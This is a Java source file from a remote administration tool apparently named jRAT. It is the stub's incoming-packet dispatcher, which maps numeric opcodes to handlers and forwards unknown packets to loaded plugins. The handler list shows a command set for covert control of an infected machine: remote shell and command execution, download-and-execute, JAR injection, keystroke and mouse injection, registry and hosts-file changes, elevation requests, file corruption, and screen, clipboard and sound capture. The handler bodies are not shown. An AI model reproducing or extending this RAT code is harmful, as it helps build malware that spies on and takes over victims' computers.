package se.jrat.stub.packets.incoming;

import java.util.HashMap;
import java.util.Set;

import se.jrat.common.PacketRange;
import se.jrat.common.exceptions.PacketException;
import se.jrat.stub.Connection;
import se.jrat.stub.Plugin;


public abstract class AbstractIncomingPacket {

	public static final HashMap<Short, Class<? extends AbstractIncomingPacket>> PACKETS_INCOMING = new HashMap<Short, Class<? extends AbstractIncomingPacket>>();

	static {
		PACKETS_INCOMING.clear();
		PACKETS_INCOMING.put((short) 0, Packet0Ping.class);
		PACKETS_INCOMING.put((short) 10, Packet10Messagebox.class);
		PACKETS_INCOMING.put((short) 11, Packet11Disconnect.class);
		PACKETS_INCOMING.put((short) 12, Packet12RemoteScreen.class);
		// 13
		PACKETS_INCOMING.put((short) 14, Packet14VisitURL.class);
		PACKETS_INCOMING.put((short) 15, Packet15ListFiles.class);
		PACKETS_INCOMING.put((short) 16, Packet16DeleteFile.class);
		PACKETS_INCOMING.put((short) 17, Packet17DownloadExecute.class);
		PACKETS_INCOMING.put((short) 18, Packet18Update.class);
		PACKETS_INCOMING.put((short) 19, Packet19ListProcesses.class);
		PACKETS_INCOMING.put((short) 20, Packet20KillProcess.class);
		PACKETS_INCOMING.put((short) 21, Packet21ClientUploadFile.class);
		PACKETS_INCOMING.put((short) 22, Packet22RemoteShellTyped.class);
		PACKETS_INCOMING.put((short) 23, Packet23RemoteShellStart.class);
		PACKETS_INCOMING.put((short) 24, Packet24RemoteShellStop.class);
		PACKETS_INCOMING.put((short) 25, Packet25RemoteShellExecute.class);
		PACKETS_INCOMING.put((short) 26, Packet26StopRemoteScreen.class);
		// 27
		PACKETS_INCOMING.put((short) 28, Packet28ShutdownComputer.class);
		PACKETS_INCOMING.put((short) 29, Packet29RestartComputer.class);
		PACKETS_INCOMING.put((short) 30, Packet30LogoutComputer.class);
		PACKETS_INCOMING.put((short) 31, Packet31ComputerSleep.class);
		PACKETS_INCOMING.put((short) 32, Packet32LockComputer.class);
		PACKETS_INCOMING.put((short) 33, Packet33UsedMemory.class);
		PACKETS_INCOMING.put((short) 34, Packet34AdvancedDownload.class);
		PACKETS_INCOMING.put((short) 35, Packet35Script.class);
		PACKETS_INCOMING.put((short) 36, Packet36Uninstall.class);
		PACKETS_INCOMING.put((short) 37, Packet37RestartJavaProcess.class);
		PACKETS_INCOMING.put((short) 38, Packet38RunCommand.class);
		PACKETS_INCOMING.put((short) 39, Packet39VisitManyURLs.class);
		PACKETS_INCOMING.put((short) 40, Packet40Thumbnail.class);
		PACKETS_INCOMING.put((short) 41, Packet41SpecialDirectory.class);
		PACKETS_INCOMING.put((short) 42, Packet42ClientDownloadFile.class);
		PACKETS_INCOMING.put((short) 43, Packet43CreateDirectory.class);
		PACKETS_INCOMING.put((short) 44, Packet44PlaySoundFromURL.class);
		PACKETS_INCOMING.put((short) 45, Packet45Reconnect.class);
		PACKETS_INCOMING.put((short) 46, Packet46CrazyMouse.class);
		PACKETS_INCOMING.put((short) 47, Packet47RenameFile.class);
		PACKETS_INCOMING.put((short) 48, Packet48ChatStart.class);
		PACKETS_INCOMING.put((short) 49, Packet49ChatEnd.class);
		PACKETS_INCOMING.put((short) 50, Packet50UpdateRemoteScreen.class);
		PACKETS_INCOMING.put((short) 51, Packet51ChatMessage.class);
		// 52
		PACKETS_INCOMING.put((short) 53, Packet53StartSearch.class);
		PACKETS_INCOMING.put((short) 54, Packet54StopSearch.class);
		PACKETS_INCOMING.put((short) 55, Packet55HostsFile.class);
		PACKETS_INCOMING.put((short) 56, Packet56UpdateHostsFile.class);
		PACKETS_INCOMING.put((short) 57, Packet57UTorrentDownloads.class);
		PACKETS_INCOMING.put((short) 58, Packet58NudgeChat.class);
		PACKETS_INCOMING.put((short) 59, Packet59Clipboard.class);
		PACKETS_INCOMING.put((short) 60, Packet60PreviewFile.class);
		PACKETS_INCOMING.put((short) 61, Packet61SystemJavaProperties.class);
		PACKETS_INCOMING.put((short) 62, Packet62PreviewImage.class);
		PACKETS_INCOMING.put((short) 63, Packet63PreviewArchive.class);
		PACKETS_INCOMING.put((short) 64, Packet64FileHash.class);
		PACKETS_INCOMING.put((short) 65, Packet65Beep.class);
		PACKETS_INCOMING.put((short) 66, Packet66PianoNote.class);
		PACKETS_INCOMING.put((short) 67, Packet67LongPianoNote.class);
		// 68
		PACKETS_INCOMING.put((short) 69, Packet69Print.class);
		PACKETS_INCOMING.put((short) 70, Packet70CorruptFile.class);
		PACKETS_INCOMING.put((short) 71, Packet71LocalNetworkDevices.class);
		PACKETS_INCOMING.put((short) 72, Packet72IPConfig.class);
		PACKETS_INCOMING.put((short) 73, Packet73ActivePorts.class);
		PACKETS_INCOMING.put((short) 74, Packet74GarbageCollect.class);
		PACKETS_INCOMING.put((short) 75, Packet75AllThumbnails.class);
		PACKETS_INCOMING.put((short) 76, Packet76Speech.class);
		PACKETS_INCOMING.put((short) 77, Packet77ListServices.class);
		PACKETS_INCOMING.put((short) 78, Packet78RegistryStartup.class);
		PACKETS_INCOMING.put((short) 79, Packet79BrowseRegistry.class);
		PACKETS_INCOMING.put((short) 80, Packet80CustomRegQuery.class);
		PACKETS_INCOMING.put((short) 81, Packet81InstalledPrograms.class);
		PACKETS_INCOMING.put((short) 82, Packet82NetworkAdapters.class);
		PACKETS_INCOMING.put((short) 83, Packet83ClientDownloadSound.class);
		PACKETS_INCOMING.put((short) 84, Packet84ToggleSoundCapture.class);
		PACKETS_INCOMING.put((short) 85, Packet85ThumbnailPreview.class);
		PACKETS_INCOMING.put((short) 86, Packet86ErrorLog.class);
		PACKETS_INCOMING.put((short) 87, Packet87DeleteErrorLog.class);
		PACKETS_INCOMING.put((short) 88, Packet88StubConfig.class);
		PACKETS_INCOMING.put((short) 89, Packet89LoadedPlugins.class);
		PACKETS_INCOMING.put((short) 90, Packet90SystemProperties.class);
		PACKETS_INCOMING.put((short) 91, Packet91MouseMove.class);
		PACKETS_INCOMING.put((short) 92, Packet92MousePress.class);
		PACKETS_INCOMING.put((short) 93, Packet93MouseRelease.class);
		PACKETS_INCOMING.put((short) 94, Packet94KeyPress.class);
		PACKETS_INCOMING.put((short) 95, Packet95KeyRelease.class);
		PACKETS_INCOMING.put((short) 96, Packet96EnvironmentVariables.class);
		PACKETS_INCOMING.put((short) 97, Packet97RegistryAdd.class);
		PACKETS_INCOMING.put((short) 98, Packet98InjectJAR.class);
		PACKETS_INCOMING.put((short) 99, Packet99RegistryDelete.class);
		PACKETS_INCOMING.put((short) 100, Packet100RequestElevation.class);
		PACKETS_INCOMING.put((short) 101, Packet101DownloadPlugin.class);
		PACKETS_INCOMING.put((short) 102, Packet102PauseClientDownload.class);
		PACKETS_INCOMING.put((short) 103, Packet103CompleteClientDownload.class);
		PACKETS_INCOMING.put((short) 104, Packet104ClientDownloadPart.class);
		PACKETS_INCOMING.put((short) 105, Packet105CancelClientUpload.class);
	}

	public static final void execute(Connection con, short header) {
		try {
			AbstractIncomingPacket packet = null;
			Set<Short> set = PACKETS_INCOMING.keySet();
			for (short s : set) {
				if (s == header) {
					packet = PACKETS_INCOMING.get(s).newInstance();
					break;
				}
			}
			
			if (packet != null && header >= 0 && header <= PacketRange.RANGE_STUB_INCOMING) {
				packet.read(con);
			} else {
				for (Plugin p : Plugin.list) {
					p.methods.get("onpacket").invoke(p.instance, new Object[] { header });
				}
			}
		} catch (Exception ex) {
			PacketException ex1 = new PacketException("Failed to handle packet " + header, ex);
			ex1.printStackTrace();
		}
	}

	public abstract void read(Connection con) throws Exception;

}
